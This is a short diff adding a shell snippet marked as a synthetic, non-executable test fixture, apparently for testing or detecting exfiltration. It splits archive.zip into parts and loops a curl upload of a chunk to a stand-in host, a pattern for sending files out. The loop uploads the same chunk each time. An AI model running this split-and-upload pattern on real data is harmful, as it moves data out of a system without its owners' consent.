@@ -1,0 +1,3 @@
+# SYNTHETIC TEST FIXTURE - not executable
+split -b 10m archive.zip part_
+for i in $(seq 1 8); do curl --retry 3 -T part_aa https://example.invalid/chunk; done
